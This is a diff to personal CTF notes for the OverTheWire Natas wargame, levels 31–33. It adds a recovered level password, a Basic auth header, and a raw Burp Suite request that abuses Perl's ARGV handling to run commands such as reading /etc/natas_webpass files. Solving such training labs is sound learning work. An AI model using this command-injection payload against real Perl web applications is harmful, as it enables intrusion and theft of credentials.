@@ -954,6 +954,7 @@ END
 - https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf?ref=learnhacking.io
 - https://www.youtube.com/watch?v=RPvORV2Amic&t=1305s&ab_channel=media.ccc.de
 
+Request used in Burp Suite Repeater
 ```
 POST /index.pl?cat%20/etc/natas_webpass/natas32%20| HTTP/1.1
 Host: natas31.natas.labs.overthewire.org
@@ -989,4 +990,39 @@ Upload
 
 ## 32->33
 - http://natas32.natas.labs.overthewire.org/
-- `natas33:`
+- `natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`
+- https://learnhacking.io/overthewire-natas-level-32-walkthrough/
+
+Request used in Burp Suite Repeater
+```
+POST /index.pl?./getpassword%20| HTTP/1.1
+Host: natas32.natas.labs.overthewire.org
+Content-Length: 383
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
+Accept-Language: en-US,en;q=0.9
+Origin: http://natas32.natas.labs.overthewire.org
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKoBdBHCSxWyuaRGS
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://natas32.natas.labs.overthewire.org/index.pl
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+------WebKitFormBoundaryKoBdBHCSxWyuaRGS
+Content-Disposition: form-data; name="file"
+
+ARGV
+------WebKitFormBoundaryKoBdBHCSxWyuaRGS
+Content-Disposition: form-data; name="file"; filename="text.csv"
+Content-Type: text/csv
+
+1,2,
+3,4,
+------WebKitFormBoundaryKoBdBHCSxWyuaRGS
+Content-Disposition: form-data; name="submit"
+
+Upload
+------WebKitFormBoundaryKoBdBHCSxWyuaRGS--
+```
